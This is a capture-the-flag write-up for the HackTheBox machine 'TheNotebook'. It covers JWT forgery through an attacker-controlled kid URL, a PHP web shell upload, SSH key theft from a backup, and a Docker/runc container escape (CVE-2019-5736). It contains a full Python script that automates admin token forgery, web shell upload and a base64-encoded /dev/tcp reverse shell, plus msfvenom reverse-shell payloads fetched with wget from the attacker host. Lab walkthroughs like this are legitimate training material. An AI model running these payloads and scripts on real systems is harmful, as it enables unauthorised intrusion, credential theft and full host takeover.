---
title: "HackTheBox - TheNotebook"
categories: [HackTheBox, Medium]
tags: [Linux,Medium,Web,OSWE,JWT]
mermaid: true
image: https://0x4rt3mis.github.io/assets/img/hackthebox/2021-09-12-HackTheBox-TheNotebook/2021-09-12-HackTheBox-TheNotebook%2003:18:17.png
---

TheNotebook was a Medium Level Box from HackTheBox, it's OS is Linux and we got container also in it.

The first shell we got trough a JWT token which we can forge and become admin on the web application. Once admin it shows us the possibility to upload files in it, including php files. So we upload a malicious php, and got a reverse shell.

The root is trough a vulnerability in the docker, which we can escape and execute commands on the host machine.

The automated script is in the post, hope you enjoy.

# Diagram

Here is the diagram for this machine. It's a resume from it.

```mermaid
graph TD
    A[Enumeration] -->|Nmap - Gobuster| B(The Notebook Web App)
    B --> C[Create User]
    C --> |SSTI| D(JWT Token)
    D --> |Python Script| E[Automated Reverse Shell]
    E --> |/var/backups| F[shaun]
    F --> |sudo -l| G[Docker CVE 2019-5736]
    G --> H[ROOT]
```

# Enumeration

First step is to enumerate the box. For this we'll use `nmap`

```sh
nmap -sV -sC -Pn 10.10.10.230
```

> -sV - Services running on the ports

> -sC - Run some standart scripts

> -Pn - Consider the host alive

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-09-12-HackTheBox-TheNotebook/2021-09-12-HackTheBox-TheNotebook%2003:11:33.png)

## Port 80

Once we found just the port 80 opened, so let's focus on this one to enumerate it.

We open it on the browser and see what is being shown.

When tryied to access 10.10.10.230 on the browser.

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-09-12-HackTheBox-TheNotebook/2021-09-12-HackTheBox-TheNotebook%2003:11:02.png)

We go to `/register`

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-09-12-HackTheBox-TheNotebook/2021-09-12-HackTheBox-TheNotebook%2003:19:08.png)

So we register an account

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-09-12-HackTheBox-TheNotebook/2021-09-12-HackTheBox-TheNotebook%2003:20:09.png)

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-09-12-HackTheBox-TheNotebook/2021-09-12-HackTheBox-TheNotebook%2003:20:19.png)

When we click in `View Notes` we are redirect to our notes page, seems to be associated with our user id

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-09-12-HackTheBox-TheNotebook/2021-09-12-HackTheBox-TheNotebook%2003:20:30.png)

When we got it on burp, the `auth` token call my attention

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-09-12-HackTheBox-TheNotebook/2021-09-12-HackTheBox-TheNotebook%2003:21:22.png)

We decode in base64 it

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-09-12-HackTheBox-TheNotebook/2021-09-12-HackTheBox-TheNotebook%2003:21:58.png)

And seems to be a `jwt` token

We decode it in [jwt.io](https://jwt.io/)

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-09-12-HackTheBox-TheNotebook/2021-09-12-HackTheBox-TheNotebook%2003:25:22.png)

## Auth Bypass

So, we can try to bypass it

We create a rsa key on our box

```sh
openssl genrsa -out key.key 2048
```

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-09-12-HackTheBox-TheNotebook/2021-09-12-HackTheBox-TheNotebook%2003:27:11.png)

Now we set the parameters on the jwt.io and encode it

We change the admin_cap to be 1, and put the kid to come to our box to download the key and authenticate.

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-09-12-HackTheBox-TheNotebook/2021-09-12-HackTheBox-TheNotebook%2003:33:23.png)

```
eyJhbGciOiJSUzI1NiIsImtpZCI6Imh0dHA6Ly8xMC4xMC4xNC4yMC9rZXkua2V5In0.eyJ1c2VybmFtZSI6IjB4NHJ0M21pcyIsImVtYWlsIjoiMHg0cnQzbWlzQGVtYWlsLmNvbSIsImFkbWluX2NhcCI6MX0.hV_wwhUpfW08GprUth6sPaI2Wi799ouFPyRI0F4IBggcN1dEE3J7HKnThY2tlDD45iwIgMwDlMDvtNVjLcsGtiZrALBEK5GOpR8b-58W03CJwQuv6mz00AnsAuip8rivgdQzrzmb4WvvCTMr1lZlgrmsw4Y2o5CEJRXfPkWHLFSI5qIGxQVgvV5slEF5T_b5pbrVLsaj7oBhhQgn33HgAZzU5pQbn8a4Y8K1npZSL60AVRj_EtlmBa8OmvyJ4UwAU7uXwtT-D4rQNqjsKpODn42ThyoC686b-G3QsXBhjsfhmK5IZ0ftVQzv6pZ_E6x822xWxZk-0fq8yKgThy8Smw
```

On 1 we enter on /admin (it can be found with gobuster or manually)

On 2 we change our cookie to the cookie we made

On 3, when we hit F5 it come to our box and download the key.key, and give me admin access

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-09-12-HackTheBox-TheNotebook/2021-09-12-HackTheBox-TheNotebook%2003:34:35.png)

## WebShell

We see the `/admin/notes` folder and got some hints

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-09-12-HackTheBox-TheNotebook/2021-09-12-HackTheBox-TheNotebook%2003:39:56.png)

PHP files being executed! Great!

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-09-12-HackTheBox-TheNotebook/2021-09-12-HackTheBox-TheNotebook%2003:40:08.png)

Possibly a user, noah

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-09-12-HackTheBox-TheNotebook/2021-09-12-HackTheBox-TheNotebook%2003:40:57.png)

So, we go to the upload file page

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-09-12-HackTheBox-TheNotebook/2021-09-12-HackTheBox-TheNotebook%2003:41:21.png)

Because the site told me it's executing php files, I'll upload a simple php cmd

```php
<?php system($_REQUEST["cmd"]); ?>
```

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-09-12-HackTheBox-TheNotebook/2021-09-12-HackTheBox-TheNotebook%2003:43:21.png)

It get uploaded with a different name

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-09-12-HackTheBox-TheNotebook/2021-09-12-HackTheBox-TheNotebook%2008:31:11.png)

But works also

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-09-12-HackTheBox-TheNotebook/2021-09-12-HackTheBox-TheNotebook%2008:31:25.png)

So, we have code execution, and a reverse shell

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-09-12-HackTheBox-TheNotebook/2021-09-12-HackTheBox-TheNotebook%2008:35:20.png)

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-09-12-HackTheBox-TheNotebook/2021-09-12-HackTheBox-TheNotebook%2008:35:26.png)

Now, let's automate it to get a reverse shell auto on this box

# Scripting - www-data shell

As always we will use python skeleton to start building our script

```py
#!/usr/bin/python3

import argparse
import requests
import sys

'''Setting up something important'''
proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
r = requests.session()

'''Here come the Functions'''

def main():
    # Parse Arguments
    parser = argparse.ArgumentParser()
    parser.add_argument('-t', '--target', help='Target ip address or hostname', required=True)
    parser.add_argument('-li', '--ipaddress', help='Listening IP address for reverse shell', required=False)
    parser.add_argument('-lp', '--port', help='Listening port for reverse shell', required=False)
    parser.add_argument('-u', '--username', help='Username to target', required=False)
    parser.add_argument('-p', '--password', help='Password value to set', required=False)
    args = parser.parse_args()
    
    '''Here we call the functions'''
    
if __name__ == '__main__':
    main()
```

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-09-12-HackTheBox-TheNotebook/2021-09-12-HackTheBox-TheNotebook%2001:45:10.png)

```sh
python3 the_note_auto.py -t 10.10.10.230 -li 10.10.14.20 -lp 443
```

the_note_auto.py

```py
#!/usr/bin/python3
# Date: 2021-10-13
# Exploit Author: 0x4rt3mis
# Hack The Box - TheNotebook
# Auto forge JWT, malicious php upload and reverse shell automated

import argparse
import requests
import sys
import socket, telnetlib
from threading import Thread
import threading
import http.server
import socket
from http.server import HTTPServer, SimpleHTTPRequestHandler
import base64
import urllib.parse
import jwt
import os

'''Setting up something important'''
proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
r = requests.session()

'''Here come the Functions'''
# Setting the python web server
def webServer():
    debug = True
    server = http.server.ThreadingHTTPServer(('0.0.0.0', 80), SimpleHTTPRequestHandler)
    if debug:
        print("[+] Starting Web Server in background [+]")
        thread = threading.Thread(target = server.serve_forever)
        thread.daemon = True
        thread.start()
    else:
        print("Starting Server")
        print('Starting server at http://{}:{}'.format('0.0.0.0', 80))
        server.serve_forever()

# Set the handler to receive the reverse shell back
def handler(lport,target):
    print("[+] Starting handler on %s [+]" %lport)
    t = telnetlib.Telnet()
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(('0.0.0.0',lport))
    s.listen(1)
    conn, addr = s.accept()
    print("[+] Connection from %s [+]" %target)
    t.sock = conn
    print("[+] Shell'd [+]")
    t.interact()

# First we need to create a simple user
def createUser(rhost):
    print("[+] Let's create the user !! [+]")
    url = "http://%s:80/register" %rhost
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    data = {"username": "0x4rt3mis", "password": "123456", "email": "0x4rt3mis@email.com"}
    r.post(url, headers=headers, data=data, proxies=proxies)
    print("[+] User created !! [+]")
    
# Now let's just login to get the token
def loginUser(rhost):
    print("[+] Let's log in as 0x4rt3mis !! [+]")
    url = "http://%s:80/login" %rhost
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    data = {"username": "0x4rt3mis", "password": "123456"}
    r.post(url, headers=headers, data=data, proxies=proxies)
    r.get(url)
    global cookie
    cookie = r.cookies.get_dict()
    cookie = cookie['uuid']

# Now let's create the token
def createToken(lhost):
    print("[+] Let's create the malicious jwt token !! [+]")
    print("[+] Let's creat the key.key !! [+]")
    os.system("openssl genrsa -out key.key 2048 2>/dev/null")
    print("[+] Openssl Key Created !!! [+]")
    private_key = open("key.key", "r")
    private_key = private_key.read().rstrip()
    global encoded
    encoded = jwt.encode(
            {"username": "0x4rt3mis",
            "email":"0x4rt3mis@email.com",
            "admin_cap":"1"},
            private_key,
            algorithm="RS256",
            headers={"kid": "http://%s/key.key" %lhost,
            "typ":"JWT"},
    )

# Let's change the token
def changeToken(rhost,cookie,encoded):
    print("[+] Let's change the token !! [+]")
    url = 'http://%s:80/' %rhost
    r.cookies.clear()
    r.get(url, proxies=proxies, cookies = {'uuid':'%s' %cookie, 'auth':'%s' %encoded})
    print("[+] Token Changeeed!!! [+]")

# Upload file in python
def adminUpload(rhost):
    url = "http://%s/admin/upload" %rhost
    os.system('echo "<?php system(\$_REQUEST[\\"cmd\\"]); ?>" > 1.php')
    files = {'file':('1.php', open('1.php', 'rb'))}
    upload = r.post(url, files=files, proxies=proxies, cookies = {'uuid':'%s' %cookie, 'auth':'%s' %encoded})
    os.system('rm 1.php')
    global php_file
    upload = r.get(url, proxies=proxies, cookies = {'uuid':'%s' %cookie, 'auth':'%s' %encoded})
    index = upload.text.find("Your Files")
    # Get only the php in it
    php_file = upload.text[index:index+150].split('.php')[0]
    php_file = php_file.split('>')[-1]
    
# Now trigger the reverse shell
def getReverse(rhost,lhost,lport,cookie,php_file):
    print("[+] Now Let's get the reverse shell! [+]")
    reverse = "bash -i >& /dev/tcp/%s/%s 0>&1" %(lhost,lport)
    message_bytes = reverse.encode('ascii')
    base64_bytes = base64.b64encode(message_bytes)
    base64_message = base64_bytes.decode('ascii')
    payload = {
    'cmd': 'echo ' + base64_message + '|base64 -d | bash'
}
    payload_str = urllib.parse.urlencode(payload, safe='|')
    url = "http://%s:80/%s.php?" %(rhost,php_file)
    r.get(url, params=payload_str, proxies=proxies, cookies = {'uuid':'%s' %cookie, 'auth':'%s' %encoded})

def main():
    # Parse Arguments
    parser = argparse.ArgumentParser()
    parser.add_argument('-t', '--target', help='Target ip address or hostname', required=True)
    parser.add_argument('-li', '--ipaddress', help='Listening IP address for reverse shell', required=True)
    parser.add_argument('-lp', '--port', help='Listening port for reverse shell', required=True)
    args = parser.parse_args()
    
    rhost = args.target
    lhost = args.ipaddress
    lport = args.port

    '''Here we call the functions'''
    # Set up the handler
    thr = Thread(target=handler,args=(int(lport),rhost))
    thr.start()
    # Set up the web python server
    webServer()
    # Lets create the user
    createUser(rhost)
    # Login and grab the auth token
    loginUser(rhost)
    # Create jwt token
    createToken(lhost)
    # changeToken
    changeToken(rhost,cookie,encoded)
    #Upload the php
    adminUpload(rhost)
    # Get the rev shell
    getReverse(rhost,lhost,lport,cookie,php_file)
if __name__ == '__main__':
    main()
```

Ok, so let's start our privilege escalation

# www-data -> noah

We start looking at the directories on the box, and with the hint we got about the backups, we found an interesting file

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-09-12-HackTheBox-TheNotebook/2021-09-12-HackTheBox-TheNotebook%2002:14:01.png)

```sh
tar -tvf home.tar.gz
tar xf home.tar.gz -O home/noah/.ssh/id_rsa
```

And we got a ssh key from noah

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-09-12-HackTheBox-TheNotebook/2021-09-12-HackTheBox-TheNotebook%2002:15:12.png)

And log in

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-09-12-HackTheBox-TheNotebook/2021-09-12-HackTheBox-TheNotebook%2002:16:37.png)

So, let's become root

# noah -> root

We realize that noah can execute root commands in a bunch of containeres

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-09-12-HackTheBox-TheNotebook/2021-09-12-HackTheBox-TheNotebook%2002:27:26.png)

So, we need to look at the docker version to see how to exploit it

```
Docker version 18.06.0-ce, build 0ffa825
```

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-09-12-HackTheBox-TheNotebook/2021-09-12-HackTheBox-TheNotebook%2002:28:02.png)

We found a exploit in exploitdb for this version of docker

[runc < 1.0-rc6 (Docker < 18.09.2) - Container Breakout (2)](https://www.exploit-db.com/exploits/46369)

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-09-12-HackTheBox-TheNotebook/2021-09-12-HackTheBox-TheNotebook%2002:30:24.png)

## CVE-2019-5736

So, let's try to exploit it.

Reading the exploit and some write-ups on the internet we get that there is a vulnerability in Docker before 18.09.2 which allows user to perform root commands in it and give root access on the host. The main idea here is from the container to overwrite the `/bin/sh #!/proc/self/exe`, which is a symbolic link to the binary which started the container process. We'll write to the runc binary and point it to the payload. When someone started the container, the payload will be triggered.

We'll use this [Exploit](https://github.com/twistlock/RunC-CVE-2019-5736) from GitHub

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-09-12-HackTheBox-TheNotebook/2021-09-12-HackTheBox-TheNotebook%2007:24:45.png)

We need to overwrite the `new_runc` file, which is going to be executed

```sh
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.20 LPORT=5555 -f elf -o new_runc
```

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-09-12-HackTheBox-TheNotebook/2021-09-12-HackTheBox-TheNotebook%2007:25:43.png)

Now we can exploit it

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-09-12-HackTheBox-TheNotebook/2021-09-12-HackTheBox-TheNotebook%2007:28:05.png)

We download the files to the container

```sh
wget 10.10.14.20:8000/new_runc
wget 10.10.14.20:8000/bash_evil
wget 10.10.14.20:8000/overwrite_runc
wget 10.10.14.20:8000/replace.sh
```

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-09-12-HackTheBox-TheNotebook/2021-09-12-HackTheBox-TheNotebook%2007:30:01.png)

Now we execute the things on the box

```sh
cp /bin/bash /bin/bash_original
chmod +x bash_evil over* repl* new*
cp bash_evil /bin/bash
./replace.sh
```

We execute the exploit

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-09-12-HackTheBox-TheNotebook/2021-09-12-HackTheBox-TheNotebook%2007:51:50.png)

Open a new docker instance

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-09-12-HackTheBox-TheNotebook/2021-09-12-HackTheBox-TheNotebook%2007:51:59.png)

And got root

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-09-12-HackTheBox-TheNotebook/2021-09-12-HackTheBox-TheNotebook%2007:52:04.png)